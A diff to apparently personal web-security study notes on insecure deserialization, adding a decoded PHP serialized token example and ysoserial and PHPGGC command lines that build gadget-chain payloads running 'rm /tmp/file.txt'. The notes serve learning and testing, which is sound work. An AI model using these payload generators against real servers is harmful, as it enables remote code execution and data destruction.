@@ -141,28 +141,56 @@ private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundE
 
 ## <mark style="color:yellow;">Injecting arbitrary objects</mark>
 
-Deserialization methods often don't validate the objects they process. Attackers can pass any serializable class, allowing them to instantiate arbitrary classes. With source code access, you can
+Deserialization methods often don't validate the objects they process. Attackers can pass any serializable class, allowing them to instantiate arbitrary classes. With source code access, you can:
 
 * Identify classes with deserialization magic methods
 * Check if they perform unsafe operations on controllable data
 * Then pass in a serialized object of this class to use its magic method for an exploit.
 
+**Important**: a serialized object may not be obvious at first view. Example:
+
+```url
+%7b%22token%22%3a%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6InRlc3QiO3M6MTI6ImFjY2Vzc190b2tlbiI7czozMjoiZmx6bnQ3ZTRwYTNobGpnN3dpejJkeGxuMHVyN3VkNjYiO30%3d%22%2c%22sig_hmac_sha1%22%3a%226d68c7db6f6b4d5abc5e84acea971fd72d217202%22%7d
+```
+
+URL decode
+
+```json
+{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6InRlc3QiO3M6MTI6ImFjY2Vzc190b2tlbiI7czozMjoiZmx6bnQ3ZTRwYTNobGpnN3dpejJkeGxuMHVyN3VkNjYiO30=","sig_hmac_sha1":"6d68c7db6f6b4d5abc5e84acea971fd72d217202"}
+```
+
+Base64 token decoding&#x20;
+
+```php
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"flznt7e4pa3hljg7wiz2dxln0ur7ud66";}
+```
+
 ## <mark style="color:yellow;">Gadget chains</mark>
 
-* A "gadget" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal.
-* The attacker's goal might simply be to invoke a method that will pass their input into another gadget
-* (many insecure deserialization vulnerabilities will only be exploitable through the use of gadget chains)
+* A "gadget" is a code snippet in an application that helps an attacker achieve a goal, such as invoking a method to pass input into another gadget. Many insecure deserialization vulnerabilities are exploitable through gadget chains.
+* Identifying gadget chains manually is arduous and nearly impossible without source code access. But if a gadget chain in Java's Apache Commons Collections library is exploitable on one website, other websites using this library may also be vulnerable.
 
-### <mark style="color:yellow;">Working with pre-built gadget chains</mark>
+### <mark style="color:yellow;">Tools (ysoserial , PHPGGC)</mark>
 
-* Manually identifying gadget chains can be a fairly arduous process, and is almost impossible without source code access.
-* But if a gadget chain in Java's Apache Commons Collections library can be exploited on one website, any other website that implements this library may also be exploitable using the same chain.
+They lets you select a provided gadget chain for a target library, input a command to execute, and generates a serialized object. This reduces the manual effort of crafting gadget chains, though some trial and error is still needed.
 
-#### ysoserial (tool) & PHP Generic Gadget Chains
+**Java**
 
-* ysoserial
-  * It lets you pick a provided gadget chain for a target library, input a command to execute, and generates a serialized object accordingly. It reduces the laborious task of manually crafting gadget chains, though some trial and error remains.
-  * TO DO...
+```bash
+# Tool: https://github.com/frohoff/ysoserial
+java -jar ysoserial-all.jar CommonsCollections4 "rm /tmp/file.txt"
+```
+
+**PHP**
+
+```sh
+# Tool: https://github.com/ambionics/phpggc
+./phpggc -b Symfony/RCE7 system "rm /tmp/file.txt"
+```
+
+{% hint style="info" %}
+**Note**: a payload might work even if the server returns an error...
+{% endhint %}
 
 ### <mark style="color:yellow;">Working with documented gadget chains</mark>
 
